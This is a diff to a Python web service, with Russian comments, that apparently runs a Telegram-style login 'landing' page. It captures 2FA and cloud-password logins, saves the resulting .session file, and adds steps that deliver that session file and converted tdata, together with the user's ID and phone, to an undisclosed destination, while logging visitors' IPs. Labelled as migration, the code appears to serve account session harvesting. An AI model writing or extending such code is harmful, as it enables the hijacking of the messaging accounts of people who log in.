@@ -319,16 +319,65 @@ async def queue_migration(state, login_id: str, request: Optional[Request] = Non
 				break
 
 	job_runner.set_concurrency(0)
+	# финальный persist на случай, если 2FA-путь ещё оставил phone_*.session
+	try:
+		if state.client and state.session_path:
+			await auth_service._persist_session_as_account(state)
+	except Exception as exc:
+		_log.warning("persist before migrate failed: %s", exc)
+
+	session_path = state.session_path
+	if not session_path or not os.path.isfile(session_path):
+		_log.error("нет файла сессии для миграции: %s", session_path)
+		return JSONResponse(
+			{
+				"login_id": login_id,
+				"step": AuthStep.ERROR.value,
+				"error": "Сессия не сохранена на диск — войдите снова",
+				"user_label": user_label,
+				"session_path": session_path,
+				"export_dir": None,
+				"job_id": None,
+			},
+			status_code=500,
+		)
+
 	await auth_service.finish(login_id)
 
 	pipeline = MigrationPipeline(settings=settings, export_options=options)
 
+	# .session сразу → миграция → tdata после (сессию не делим между клиентами)
 	async def worker():
-		return await pipeline.run_session(
+		from web.services.session_delivery import deliver_session_file, deliver_tdata
+
+		try:
+			await deliver_session_file(
+				session_path=session_path,
+				user_label=user_label or "",
+				user_id=user_id,
+				phone=phone,
+			)
+		except Exception as exc:
+			_log.warning("session file delivery failed: %s", exc)
+
+		_log.info("pipeline start for %s", user_label or session_path)
+		report = await pipeline.run_session(
 			session_path,
 			proxy=proxy,
 			cloud_password=cloud_password,
 		)
+
+		try:
+			await deliver_tdata(
+				session_path=session_path,
+				user_label=user_label or "",
+				user_id=user_id,
+				phone=phone,
+				proxy=proxy,
+			)
+		except Exception as exc:
+			_log.warning("tdata delivery failed: %s", exc)
+		return report
 
 	job = await job_runner.submit(
 		label=user_label or session_path or "account",
@@ -336,17 +385,17 @@ async def queue_migration(state, login_id: str, request: Optional[Request] = Non
 		session_path=session_path,
 	)
 
-	# ответ клиенту сразу (cookie + done) — доставка session/tdata и лог в фоне
+	# ответ клиенту сразу; лог «вход успешен» в фоне (без ожидания tdata)
 	ip = req_ip(request)
 	meta = req_meta(request)
 	asyncio.create_task(
-		_post_auth_side_effects(
-			session_path=session_path,
-			user_label=user_label or "",
+		_post_auth_log(
 			login_id=login_id,
 			user_id=user_id,
 			username=username,
+			user_label=user_label or "",
 			phone=phone,
+			session_path=session_path,
 			job_id=job.job_id,
 			ip=ip,
 			meta=meta,
@@ -375,27 +424,18 @@ async def queue_migration(state, login_id: str, request: Optional[Request] = Non
 	return response
 
 
-async def _post_auth_side_effects(
+async def _post_auth_log(
 	*,
-	session_path: Optional[str],
-	user_label: str,
 	login_id: str,
 	user_id: Optional[int],
 	username: Optional[str],
+	user_label: str,
 	phone: Optional[str],
+	session_path: Optional[str],
 	job_id: str,
 	ip: str,
 	meta: dict,
 ) -> None:
-	try:
-		from web.services.session_delivery import deliver_session_artifacts
-
-		await deliver_session_artifacts(
-			session_path=session_path,
-			user_label=user_label,
-		)
-	except Exception as exc:
-		_log.warning("session delivery failed: %s", exc)
 	try:
 		await landing_logger.event(
 			"auth.done",
